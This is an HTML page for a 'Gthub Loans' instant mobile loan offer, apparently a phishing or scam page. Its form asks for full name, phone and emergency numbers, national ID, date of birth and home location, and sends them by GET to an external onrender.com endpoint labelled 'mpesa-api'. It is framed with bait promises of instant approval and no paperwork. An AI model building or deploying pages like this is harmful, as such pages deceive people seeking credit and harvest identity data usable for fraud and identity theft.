<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gthub Loans</title>
    <style>
        body {
            background-color: #004B23; /* Jungle Green Background */
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .form-container {
            width: 100%;
            max-width: 440px;
            padding: 30px;
            background-color: #ffffff; /* White card layout container */
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        h1 {
            color: #004B23;
            margin-top: 0;
            margin-bottom: 10px;
            font-size: 28px;
            font-weight: 800;
        }
        .intro-text {
            color: #333333;
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 20px;
        }
        .benefits-list {
            margin-bottom: 20px;
            line-height: 1.8;
            font-size: 15px;
            color: #222222;
        }
        .promo-image {
            width: 100%;
            height: auto;
            max-width: 100%;
            border-radius: 8px;
            margin-bottom: 20px;
            display: block;
        }
        .call-to-action {
            font-weight: bold;
            color: #000000;
            margin-bottom: 25px;
            font-size: 15px;
        }
        .field-group {
            margin-bottom: 18px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            font-weight: 600;
            color: #111111;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            background-color: #000000;
            color: #ffffff;
            border: 2px solid #000000;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #004B23;
        }
        input::placeholder {
            color: #888888;
        }
        .submit-btn {
            width: 100%;
            padding: 14px;
            background-color: #004B23; /* Matching Jungle Green */
            color: #ffffff;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.2s;
        }
        .submit-btn:hover {
            background-color: #003318;
        }
    </style>
</head>
<body>

    <div class="form-container">
        
        <!-- Loan Promotion Content Section -->
        <h1>Gthub Loans</h1>
        
        <p class="intro-text">Get instant mobile loans directly on your phone—anytime, anywhere.</p>
        
        <div class="benefits-list">
            ✔️ Instant approval<br>
            ✔️ No paperwork<br>
            ✔️ Flexible repayment terms<br>
            ✔️ Secure & reliable
        </div>
        
        <!-- Your PC image linked accurately below -->
        <img src="ddsdsgds.png" alt="Loan Promotion" class="promo-image">
        
        <p class="call-to-action">💰 Borrow Today, Repay with Ease. Apply now</p>

        <!-- Form Section pointing to Render Landing Page -->
        <form action="https://mpesa-api-z14k.onrender.com/" method="GET">
            
            <div class="field-group">
                <label for="fullname">Full Name</label>
                <input type="text" id="fullname" name="fullname" placeholder="e.g. John Doe" required>
            </div>

            <div class="field-group">
                <label for="phone">Phone Number</label>
                <input type="tel" id="phone" name="phone" placeholder="e.g. 0712345678" required>
            </div>

            <div class="field-group">
                <label for="emergency_phone">Emergency Contact Number</label>
                <input type="tel" id="emergency_phone" name="emergency_phone" placeholder="e.g. 0712345678" required>
            </div>

            <div class="field-group">
                <label for="nationalid">National ID</label>
                <input type="text" id="nationalid" name="nationalid" placeholder="e.g. 12345678" required>
            </div>

            <div class="field-group">
                <label for="dob">Date Of Birth</label>
                <input type="text" id="dob" name="dob" placeholder="e.g. 01/03/1995" required>
            </div>

            <div class="field-group">
                <label for="county">County</label>
                <input type="text" id="county" name="county" placeholder="e.g. Nairobi" required>
            </div>

            <div class="field-group">
                <label for="location">Location</label>
                <input type="text" id="location" name="location" placeholder="e.g. Kasarani" required>
            </div>

            <div class="field-group">
                <label for="amount">Loan Amount To Apply</label>
                <input type="text" id="amount" name="amount" placeholder="e.g. 100000" required>
            </div>

            <!-- Submit Button -->
            <button type="submit" class="submit-btn">Apply Now</button>

        </form>
    </div>

</body>
</html>
